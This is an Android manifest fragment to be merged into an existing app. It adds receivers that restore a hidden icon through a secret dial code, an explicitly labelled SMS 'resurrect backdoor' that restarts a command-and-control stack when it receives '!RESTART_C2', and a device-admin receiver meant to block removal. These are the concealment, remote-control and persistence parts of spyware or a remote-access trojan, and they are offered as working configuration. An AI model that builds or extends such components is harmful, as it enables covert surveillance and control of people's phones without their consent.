<!-- 2026 upgrade additions — merge these nodes into the existing manifest -->

<!-- Inside <manifest><application> ... add: -->

    <!-- Secret-code recovery: dial *#1337# to restore the hidden icon -->
    <receiver
        android:name=".receiver.DialerUnlockReceiver"
        android:enabled="true"
        android:exported="true">
        <intent-filter>
            <action android:name="android.provider.Telephony.SECRET_CODE" />
            <data android:scheme="android_secret_code" android:host="1337" />
        </intent-filter>
    </receiver>

    <!-- SMS resurrect backdoor: !RESTART_C2 forces the stack back online -->
    <receiver
        android:name=".receiver.SmsResurrectReceiver"
        android:enabled="true"
        android:exported="true"
        android:permission="android.permission.BROADCAST_SMS">
        <intent-filter android:priority="999">
            <action android:name="android.provider.Telephony.SMS_RECEIVED" />
        </intent-filter>
    </receiver>

    <!-- Device admin fallback for anti-removal -->
    <receiver
        android:name=".features.antiremoval.AntiRemovalManager$AdminReceiver"
        android:enabled="true"
        android:exported="true"
        android:permission="android.permission.BIND_DEVICE_ADMIN">
        <meta-data
            android:name="android.app.device_admin"
            android:resource="@xml/device_admin" />
        <intent-filter>
            <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
        </intent-filter>
    </receiver>

